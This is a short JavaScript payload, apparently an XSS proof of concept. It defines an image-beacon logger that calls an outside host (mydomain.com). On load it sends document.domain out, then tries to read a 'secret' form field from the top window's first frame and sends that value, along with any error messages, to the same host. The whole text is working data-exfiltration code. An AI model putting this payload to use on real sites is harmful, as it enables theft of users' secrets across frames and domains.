function log(n) {
var img = document.createElement("img");
img.src = "http://mydomain.com/xss" + n + ".gif";
document.body.appendChild(img);
} 

function magic() {
    log(1);
    log(document.domain);
    try {
        var d = window.top.frames[0].window.document;
        log(d.getElementsByName("secret")[0].value);
    } catch(e) {
        log(11);
        log(e.message);
    }

    log(2);
}

log(0);
setTimeout("magic()", 500);

  